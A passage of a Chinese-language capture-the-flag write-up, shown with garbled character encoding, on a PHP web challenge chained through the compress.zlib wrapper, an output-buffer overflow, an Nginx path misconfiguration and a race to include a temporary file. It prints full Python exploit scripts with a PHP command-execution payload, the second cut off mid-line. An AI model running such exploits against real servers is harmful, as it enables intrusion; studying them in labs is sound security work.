æˆ‘ä»¬è²Œä¼¼åªèƒ½ç­‰åˆ°å…¨éƒ¨å‡½æ•°ç»“æŸä¹‹åæ‰èƒ½æ‹¿åˆ°è·¯å¾„ï¼Œç„¶è€Œä¹‹å‰æˆ‘ä»¬è¯´åˆ°çš„éœ€è¦ä¿ç•™çš„é•¿é“¾æ¥ä¸èƒ½è®©æˆ‘ä»¬ç«‹å³å¾—åˆ°æˆ‘ä»¬çš„sandboxè·¯å¾„ã€‚"></a>è™½ç„¶æˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹åˆ°é¢˜ç›®æ˜¯ç›´æ¥ç»™å‡ºäº†è·¯å¾„ï¼Œä½†æ˜¯ä¹ä¸€çœ‹ä»£ç æˆ‘ä»¬è²Œä¼¼åªèƒ½ç­‰åˆ°å…¨éƒ¨å‡½æ•°ç»“æŸä¹‹åæ‰èƒ½æ‹¿åˆ°è·¯å¾„ï¼Œç„¶è€Œä¹‹å‰æˆ‘ä»¬è¯´åˆ°çš„éœ€è¦ä¿ç•™çš„é•¿é“¾æ¥ä¸èƒ½è®©æˆ‘ä»¬ç«‹å³å¾—åˆ°æˆ‘ä»¬çš„sandboxè·¯å¾„ã€‚</h6><h6 id="æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¼ å…¥è¿‡å¤§çš„nameå‚æ•°ï¼Œå¯¼è‡´PHP-output-bufferæº¢å‡ºï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„ï¼Œå‚è€ƒä»£ç ï¼š"><a href="#æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¼ å…¥è¿‡å¤§çš„nameå‚æ•°ï¼Œå¯¼è‡´PHP-output-bufferæº¢å‡ºï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„ï¼Œå‚è€ƒä»£ç ï¼š" class="headerlink" title="æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¼ å…¥è¿‡å¤§çš„nameå‚æ•°ï¼Œå¯¼è‡´PHP output bufferæº¢å‡ºï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„ï¼Œå‚è€ƒä»£ç ï¼š"></a>æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ä¼ å…¥è¿‡å¤§çš„nameå‚æ•°ï¼Œå¯¼è‡´PHP output bufferæº¢å‡ºï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„ï¼Œå‚è€ƒä»£ç ï¼š</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    data = <span class="string">'''file=compress.zlib://http://192.168.151.132:8080&amp;name='''</span>.strip() + <span class="string">'a'</span> * (<span class="number">1024</span> * <span class="number">7</span> + <span class="number">882</span>)</span><br><span class="line">    r.send(<span class="string">'''POST / HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: localhost\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;\r</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=asdasdasd\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#123;&#125;\r</span></span><br><span class="line"><span class="string">'''</span>.format(len(data), data))</span><br></pre></td></tr></table></figure>

<h6 id="GET-Flag"><a href="#GET-Flag" class="headerlink" title="GET Flag"></a>GET Flag</h6><h6 id="æ‰€ä»¥æ•´ä¸ªæµç¨‹æˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹ï¼š"><a href="#æ‰€ä»¥æ•´ä¸ªæµç¨‹æˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹ï¼š" class="headerlink" title="æ‰€ä»¥æ•´ä¸ªæµç¨‹æˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹ï¼š"></a>æ‰€ä»¥æ•´ä¸ªæµç¨‹æˆ‘ä»¬å¯ä»¥æ€»ç»“ä¸ºä»¥ä¸‹ï¼š</h6><h6 id="1-åˆ©ç”¨compress-zlib-http-æˆ–è€…compress-zlib-ftp-æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œå¹¶ä¿æŒ-HTTP-é•¿é“¾æ¥ç«äº‰ä¿å­˜æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶"><a href="#1-åˆ©ç”¨compress-zlib-http-æˆ–è€…compress-zlib-ftp-æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œå¹¶ä¿æŒ-HTTP-é•¿é“¾æ¥ç«äº‰ä¿å­˜æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="1.åˆ©ç”¨compress.zlib://http://æˆ–è€…compress.zlib://ftp://æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œå¹¶ä¿æŒ HTTP é•¿é“¾æ¥ç«äº‰ä¿å­˜æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶"></a>1.åˆ©ç”¨<code>compress.zlib://http://</code>æˆ–è€…<code>compress.zlib://ftp://</code>æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œå¹¶ä¿æŒ HTTP é•¿é“¾æ¥ç«äº‰ä¿å­˜æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶</h6><h6 id="2-åˆ©ç”¨è¶…é•¿çš„-name-æº¢å‡º-output-buffer-å¾—åˆ°-sandbox-è·¯å¾„"><a href="#2-åˆ©ç”¨è¶…é•¿çš„-name-æº¢å‡º-output-buffer-å¾—åˆ°-sandbox-è·¯å¾„" class="headerlink" title="2.åˆ©ç”¨è¶…é•¿çš„ name æº¢å‡º output buffer å¾—åˆ° sandbox è·¯å¾„"></a>2.åˆ©ç”¨è¶…é•¿çš„ name æº¢å‡º output buffer å¾—åˆ° sandbox è·¯å¾„</h6><h6 id="3-åˆ©ç”¨-Nginx-é…ç½®é”™è¯¯ï¼Œé€šè¿‡-well-known-files-sandbox-æ¥è·å–æˆ‘ä»¬-tmp-æ–‡ä»¶çš„æ–‡ä»¶å"><a href="#3-åˆ©ç”¨-Nginx-é…ç½®é”™è¯¯ï¼Œé€šè¿‡-well-known-files-sandbox-æ¥è·å–æˆ‘ä»¬-tmp-æ–‡ä»¶çš„æ–‡ä»¶å" class="headerlink" title="3.åˆ©ç”¨ Nginx é…ç½®é”™è¯¯ï¼Œé€šè¿‡.well-known../files/sandbox/æ¥è·å–æˆ‘ä»¬ tmp æ–‡ä»¶çš„æ–‡ä»¶å"></a>3.åˆ©ç”¨ Nginx é…ç½®é”™è¯¯ï¼Œé€šè¿‡<code>.well-known../files/sandbox/</code>æ¥è·å–æˆ‘ä»¬ tmp æ–‡ä»¶çš„æ–‡ä»¶å</h6><h6 id="4-å‘é€å¦ä¸€ä¸ªè¯·æ±‚åŒ…å«æˆ‘ä»¬çš„-tmp-æ–‡ä»¶ï¼Œæ­¤æ—¶å¹¶æ²¡æœ‰-PHP-ä»£ç "><a href="#4-å‘é€å¦ä¸€ä¸ªè¯·æ±‚åŒ…å«æˆ‘ä»¬çš„-tmp-æ–‡ä»¶ï¼Œæ­¤æ—¶å¹¶æ²¡æœ‰-PHP-ä»£ç " class="headerlink" title="4.å‘é€å¦ä¸€ä¸ªè¯·æ±‚åŒ…å«æˆ‘ä»¬çš„ tmp æ–‡ä»¶ï¼Œæ­¤æ—¶å¹¶æ²¡æœ‰ PHP ä»£ç "></a>4.å‘é€å¦ä¸€ä¸ªè¯·æ±‚åŒ…å«æˆ‘ä»¬çš„ tmp æ–‡ä»¶ï¼Œæ­¤æ—¶å¹¶æ²¡æœ‰ PHP ä»£ç </h6><h6 id="5-ç»•è¿‡-WAF-åˆ¤æ–­åï¼Œå‘é€-PHP-ä»£ç æ®µï¼ŒåŒ…å«æˆ‘ä»¬çš„-PHP-ä»£ç æ‹¿åˆ°-Flag"><a href="#5-ç»•è¿‡-WAF-åˆ¤æ–­åï¼Œå‘é€-PHP-ä»£ç æ®µï¼ŒåŒ…å«æˆ‘ä»¬çš„-PHP-ä»£ç æ‹¿åˆ°-Flag" class="headerlink" title="5.ç»•è¿‡ WAF åˆ¤æ–­åï¼Œå‘é€ PHP ä»£ç æ®µï¼ŒåŒ…å«æˆ‘ä»¬çš„ PHP ä»£ç æ‹¿åˆ° Flag"></a>5.ç»•è¿‡ WAF åˆ¤æ–­åï¼Œå‘é€ PHP ä»£ç æ®µï¼ŒåŒ…å«æˆ‘ä»¬çš„ PHP ä»£ç æ‹¿åˆ° Flag</h6><h6 id="æ•´ä¸ªé¢˜ç›®çš„å…³é”®ç‚¹ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç‚¹-æ¥è‡ª-wupco-ï¼š"><a href="#æ•´ä¸ªé¢˜ç›®çš„å…³é”®ç‚¹ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç‚¹-æ¥è‡ª-wupco-ï¼š" class="headerlink" title="æ•´ä¸ªé¢˜ç›®çš„å…³é”®ç‚¹ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç‚¹(æ¥è‡ª @wupco)ï¼š"></a>æ•´ä¸ªé¢˜ç›®çš„å…³é”®ç‚¹ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ç‚¹(æ¥è‡ª @wupco)ï¼š</h6><h6 id="è¦åˆ©ç”¨å¤§æ–‡ä»¶æˆ–ftpé€Ÿåº¦é™åˆ¶è®©è¿æ¥ä¿æŒ"><a href="#è¦åˆ©ç”¨å¤§æ–‡ä»¶æˆ–ftpé€Ÿåº¦é™åˆ¶è®©è¿æ¥ä¿æŒ" class="headerlink" title="è¦åˆ©ç”¨å¤§æ–‡ä»¶æˆ–ftpé€Ÿåº¦é™åˆ¶è®©è¿æ¥ä¿æŒ"></a>è¦åˆ©ç”¨å¤§æ–‡ä»¶æˆ–ftpé€Ÿåº¦é™åˆ¶è®©è¿æ¥ä¿æŒ</h6><h6 id="ä¼ å…¥nameè¿‡å¤§-overflow-output-bufferï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„"><a href="#ä¼ å…¥nameè¿‡å¤§-overflow-output-bufferï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„" class="headerlink" title="ä¼ å…¥nameè¿‡å¤§ overflow output bufferï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„"></a>ä¼ å…¥nameè¿‡å¤§ overflow output bufferï¼Œåœ¨ä¿æŒè¿æ¥çš„æƒ…å†µä¸‹è·å–æ²™ç®±è·¯å¾„</h6><h6 id="tmpæ–‡ä»¶éœ€è¦åœ¨ä¸¤ç§æ–‡ä»¶ç›´æ¥ç–¯ç‹‚åˆ‡æ¢ï¼Œä½¿å¾—ç¬¬ä¸€æ¬¡file-get-contentsè·å–çš„å†…å®¹ä¸å¸¦æœ‰-lt-includeçš„æ—¶å€™æ˜¯æ­£å¸¸phpä»£ç ï¼Œéœ€è¦å¡æ—¶é—´ç‚¹ï¼Œæ‰€ä»¥è¦å¤šè·‘å‡ æ¬¡æ‰è¡Œ"><a href="#tmpæ–‡ä»¶éœ€è¦åœ¨ä¸¤ç§æ–‡ä»¶ç›´æ¥ç–¯ç‹‚åˆ‡æ¢ï¼Œä½¿å¾—ç¬¬ä¸€æ¬¡file-get-contentsè·å–çš„å†…å®¹ä¸å¸¦æœ‰-lt-includeçš„æ—¶å€™æ˜¯æ­£å¸¸phpä»£ç ï¼Œéœ€è¦å¡æ—¶é—´ç‚¹ï¼Œæ‰€ä»¥è¦å¤šè·‘å‡ æ¬¡æ‰è¡Œ" class="headerlink" title="tmpæ–‡ä»¶éœ€è¦åœ¨ä¸¤ç§æ–‡ä»¶ç›´æ¥ç–¯ç‹‚åˆ‡æ¢ï¼Œä½¿å¾—ç¬¬ä¸€æ¬¡file_get_contentsè·å–çš„å†…å®¹ä¸å¸¦æœ‰&lt;?,includeçš„æ—¶å€™æ˜¯æ­£å¸¸phpä»£ç ï¼Œéœ€è¦å¡æ—¶é—´ç‚¹ï¼Œæ‰€ä»¥è¦å¤šè·‘å‡ æ¬¡æ‰è¡Œ"></a>tmpæ–‡ä»¶éœ€è¦åœ¨ä¸¤ç§æ–‡ä»¶ç›´æ¥ç–¯ç‹‚åˆ‡æ¢ï¼Œä½¿å¾—ç¬¬ä¸€æ¬¡<code>file_get_contents</code>è·å–çš„å†…å®¹ä¸å¸¦æœ‰<code>&lt;?</code>,<code>include</code>çš„æ—¶å€™æ˜¯æ­£å¸¸phpä»£ç ï¼Œéœ€è¦å¡æ—¶é—´ç‚¹ï¼Œæ‰€ä»¥è¦å¤šè·‘å‡ æ¬¡æ‰è¡Œ</h6><h6 id="well-known-files-æ˜¯nginxé…ç½®æ¼æ´ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œç”¨æ¥åˆ—ç”Ÿæˆçš„tmpæ–‡ä»¶"><a href="#well-known-files-æ˜¯nginxé…ç½®æ¼æ´ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œç”¨æ¥åˆ—ç”Ÿæˆçš„tmpæ–‡ä»¶" class="headerlink" title=".well-known../files/æ˜¯nginxé…ç½®æ¼æ´ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œç”¨æ¥åˆ—ç”Ÿæˆçš„tmpæ–‡ä»¶"></a><code>.well-known../files/</code>æ˜¯nginxé…ç½®æ¼æ´ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œç”¨æ¥åˆ—ç”Ÿæˆçš„tmpæ–‡ä»¶</h6><h6 id="ç”±äºç¬¬äºŒä¸ªæçŸ­çš„æ—¶é—´çª—ï¼Œæˆ‘ä»¬éœ€è¦æ¯”è¾ƒå‡†ç¡®åœ°è°ƒæ§å»¶è¿Ÿæ—¶é—´ï¼Œä¹‹å‰æ²¡è°ƒæ§å¥½æ—¶é—´ä»¥åŠæ–‡ä»¶å¤§å°ï¼ŒæŒ‚ä¸€æ™šä¸Šè„šæœ¬éƒ½æ²¡æœ‰-hit-ä¸­ä¸€æ¬¡ï¼Œç¬¬äºŒå¤©ç»è¿‡-rebirth-çš„æ·±åˆ»æŒ‡ç‚¹ï¼Œä¿®æ”¹äº†ä¸€ä¸‹å»¶è¿Ÿæ—¶é—´ä»¥åŠæœåŠ¡å™¨å“åº”çš„æ–‡ä»¶çš„å¤§å°ï¼ŒæˆåŠŸç‡å¾—åˆ°äº†å¾ˆå¤§çš„æé«˜ï¼ŒåŸºæœ¬æ¯æ¬¡éƒ½å¯ä»¥-getflag"><a href="#ç”±äºç¬¬äºŒä¸ªæçŸ­çš„æ—¶é—´çª—ï¼Œæˆ‘ä»¬éœ€è¦æ¯”è¾ƒå‡†ç¡®åœ°è°ƒæ§å»¶è¿Ÿæ—¶é—´ï¼Œä¹‹å‰æ²¡è°ƒæ§å¥½æ—¶é—´ä»¥åŠæ–‡ä»¶å¤§å°ï¼ŒæŒ‚ä¸€æ™šä¸Šè„šæœ¬éƒ½æ²¡æœ‰-hit-ä¸­ä¸€æ¬¡ï¼Œç¬¬äºŒå¤©ç»è¿‡-rebirth-çš„æ·±åˆ»æŒ‡ç‚¹ï¼Œä¿®æ”¹äº†ä¸€ä¸‹å»¶è¿Ÿæ—¶é—´ä»¥åŠæœåŠ¡å™¨å“åº”çš„æ–‡ä»¶çš„å¤§å°ï¼ŒæˆåŠŸç‡å¾—åˆ°äº†å¾ˆå¤§çš„æé«˜ï¼ŒåŸºæœ¬æ¯æ¬¡éƒ½å¯ä»¥-getflag" class="headerlink" title="ç”±äºç¬¬äºŒä¸ªæçŸ­çš„æ—¶é—´çª—ï¼Œæˆ‘ä»¬éœ€è¦æ¯”è¾ƒå‡†ç¡®åœ°è°ƒæ§å»¶è¿Ÿæ—¶é—´ï¼Œä¹‹å‰æ²¡è°ƒæ§å¥½æ—¶é—´ä»¥åŠæ–‡ä»¶å¤§å°ï¼ŒæŒ‚ä¸€æ™šä¸Šè„šæœ¬éƒ½æ²¡æœ‰ hit ä¸­ä¸€æ¬¡ï¼Œç¬¬äºŒå¤©ç»è¿‡ @rebirth çš„æ·±åˆ»æŒ‡ç‚¹ï¼Œä¿®æ”¹äº†ä¸€ä¸‹å»¶è¿Ÿæ—¶é—´ä»¥åŠæœåŠ¡å™¨å“åº”çš„æ–‡ä»¶çš„å¤§å°ï¼ŒæˆåŠŸç‡å¾—åˆ°äº†å¾ˆå¤§çš„æé«˜ï¼ŒåŸºæœ¬æ¯æ¬¡éƒ½å¯ä»¥ getflag"></a>ç”±äºç¬¬äºŒä¸ªæçŸ­çš„æ—¶é—´çª—ï¼Œæˆ‘ä»¬éœ€è¦æ¯”è¾ƒå‡†ç¡®åœ°è°ƒæ§å»¶è¿Ÿæ—¶é—´ï¼Œä¹‹å‰æ²¡è°ƒæ§å¥½æ—¶é—´ä»¥åŠæ–‡ä»¶å¤§å°ï¼ŒæŒ‚ä¸€æ™šä¸Šè„šæœ¬éƒ½æ²¡æœ‰ hit ä¸­ä¸€æ¬¡ï¼Œç¬¬äºŒå¤©ç»è¿‡ @rebirth çš„æ·±åˆ»æŒ‡ç‚¹ï¼Œä¿®æ”¹äº†ä¸€ä¸‹å»¶è¿Ÿæ—¶é—´ä»¥åŠæœåŠ¡å™¨å“åº”çš„æ–‡ä»¶çš„å¤§å°ï¼ŒæˆåŠŸç‡å¾—åˆ°äº†å¾ˆå¤§çš„æé«˜ï¼ŒåŸºæœ¬æ¯æ¬¡éƒ½å¯ä»¥ getflag</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/hxp-363c-ctf-2019-2.png" alt></p>
<h6 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> gg <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line"></span><br><span class="line">    r = remote(<span class="string">"192.168.220.154"</span>, <span class="number">5478</span>)</span><br><span class="line">    l = listen(<span class="number">5487</span>)</span><br><span class="line"></span><br><span class="line">    data = <span class="string">'''name=&#123;&#125;&amp;file=compress.zlib://http://192.168.220.157:5487'''</span>.format(<span class="string">"a"</span> * <span class="number">8050</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'''POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.220.154:5478</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=asdasdasd</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;'''</span>.format(len(data), data).replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">    r.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">'your sandbox: '</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        print(<span class="string">"[ERROR]: EOFERROR"</span>)</span><br><span class="line">        <span class="comment"># l.close()</span></span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># dirname = r.recv(70)</span></span><br><span class="line">    dirname = r.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>) + <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[DEBUG]:"</span> + dirname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send trash</span></span><br><span class="line">    c = l.wait_for_connection()</span><br><span class="line">    resp = <span class="string">'''HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">Date: Sun, 29 Dec 2019 05:22:47 GMT</span></span><br><span class="line"><span class="string">Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string">Vary: Accept-Encoding</span></span><br><span class="line"><span class="string">Content-Length: 534</span></span><br><span class="line"><span class="string">Content-Type: text/html; charset=UTF-8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;'''</span>.format(<span class="string">'A'</span> * <span class="number">5000000</span>).replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">    c.send(resp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get filename</span></span><br><span class="line">    r2 = requests.get(<span class="string">"http://192.168.220.154:5478/.well-known../"</span> + dirname + <span class="string">"/"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tmpname = <span class="string">"php"</span> + re.findall(<span class="string">"&gt;php(.*)&lt;\/a"</span>, r2.text)[<span class="number">0</span>]</span><br><span class="line">        print(<span class="string">"[DEBUG]:"</span> + tmpname)</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        l.close()</span><br><span class="line">        r.close()</span><br><span class="line">        print(<span class="string">"[ERROR]: IndexErorr"</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">()</span>:</span></span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        phpcode = <span class="string">'wtf&lt;?php system("/readflag");?&gt;'</span>;</span><br><span class="line">        c.send(phpcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    t = threading.Thread(target=job)</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># file_get_contents and include tmp file</span></span><br><span class="line">    exp_file = dirname + <span class="string">"/"</span> + tmpname</span><br><span class="line">    print(<span class="string">"[DEBUG]:"</span> + exp_file)</span><br><span class="line">    r3 = requests.post(<span class="string">"http://192.168.220.154:5478/"</span>, data=&#123;<span class="string">'file'</span>: exp_file&#125;)</span><br><span class="line">    print(r3.status_code, r3.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"wtf"</span> <span class="keyword">in</span> r3.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    t.join()</span><br><span class="line">    r.close()</span><br><span class="line">    l.close()</span><br><span class="line">    <span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure>

<h6 id="å‚è€ƒçš„exp"><a href="#å‚è€ƒçš„exp" class="headerlink" title="å‚è€ƒçš„exp"></a>å‚è€ƒçš„exp</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> gg <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line"></span><br><span class="line">    r = remote(<span class="string">"192.168.220.154"</span>, <span class="number">5478</span>)</span><br><span class="line">    l = listen(<span class="number">5487</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'''POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.220.154:5478</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><br><span class="line"><span class="string">Content-Length: 8104</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">name=&#123;&#125;&amp;file=compress.zlib://http://192.168.220.157:5487'''</span>.format(<span class="string">"a"</span>*<span class="number">8050</span>).replace(<span class="string">"\n"</span>,<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    r.send(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"your sandbox: "</span>)</span><br><span class="line">    dirname = r.recv(<span class="number">70</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[DEBUG]:"</span> + dirname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send trash</span></span><br><span class="line">    c = l.wait_for_connection()</span><br><span class="line">    resp = <span class="string">'''HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">Date: Sun, 29 Dec 2019 05:22:47 GMT</span></span><br><span class="line"><span class="string">Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string">Vary: Accept-Encoding</span></span><br><span class="line"><span class="string">Content-Length: 5000031</span></span><br><span class="line"><span class="string">Content-Type: text/html; charset=UTF-8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;'''</span>.format(<span class="string">"A"</span>*<span class="number">5000000</span>).replace(<span class="string">"\n"</span>,<span class="string">"\r\n"</span>)</span><br><span class="line">    c.send(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get filename</span></span><br><span class="line">    r2 = requests.get(<span class="string">"http://192.168.220.154:5478/.well-known../"</span>+ dirname + <span class="string">"/"</span>)</span><br><span class="line">    print(<span class="string">"dirname:"</span> + dirname);</span><br><span class="line">    tmpname = <span class="string">"php"</span> + re.findall(<span 